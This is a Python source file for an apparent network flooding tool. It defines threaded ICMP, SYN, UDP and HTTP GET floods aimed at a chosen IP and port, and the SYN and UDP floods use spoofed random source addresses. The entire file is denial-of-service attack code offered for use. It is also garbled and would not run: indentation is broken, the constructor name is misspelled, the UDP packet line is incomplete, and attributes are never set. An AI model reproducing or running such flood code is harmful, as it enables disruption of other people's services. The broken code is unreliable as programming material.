import sys
import time
import threading
import random
import requests
from scapy.all import IP, ICMP, TCP, UDP, send

class MAIN:
    def _init_(self, target_ip, target_port, count, threads):
        self.target_ip = target_ip
        self.target_port = target_port
        self.count = count
        self.source_ip = ".".join(map(str, (random.randint(0, 255)
for _ in range(4))))
    self.source_port = random.randint(1024, 65535)
    
    def running_text(self, text):
        for i in text + "\n":
            sys.stdout.write(i)
            sys.stdout.flush()
            time.sleep(0.02)
            
    def start_attack(self, menu):
        if menu == 1:
            for _ in range(self.threads)
 threading.Thread(target=self.ICMP_FLOOD).start()
     elif menu == 2:
            for _ in range(self.threads):
 threading.Thread(target=self.SYN_FLOOD).start()
     elif menu == 3:
            for _ in range(self.threads):
 threading.Thread(target=self.UDP_FLOOD).start()
     elif menu == 4:
            for _ in range(self.threads):  
 threading.Thread(target=self.HTTP_GET_FLOOD).start()
     else:
         return "Hio port iko nje bro!!"
         
  class Attack(Main):
      def ICMP_FLOOD(self):
          for _ in range(self.count):
              packet = IP(dst=self.target_ip)/ICMP()
              send(packet, verbose=False)
        
        def SYN_FLOOD(self):
          for _ in range(self.count):
              packet = IP(src=self.source_ip, dst=self.target_ip)/TCP(sport=self.source_port,dport=self.target_port, flag="S")
              send(packet, verbose=False) 
         
         def UDP_FLOOD(self):
          for _ in range(self.count):
              packet = IP(src=self.source_ip, dst=self.target_ip)/
              send(packet, verbose=False)     
              
         def HTTP_GET_FLOOD(self):
          target_url =f"http://{self.target_ip}:{self.target_port}"
          for _in range(self.count):
              try: 
            response = requests.get(target_url)
            print(f"Response Code: {response.status_code}")
            
                except Exception as e:
                    print(f"Errpr:{e}")
             
             pass
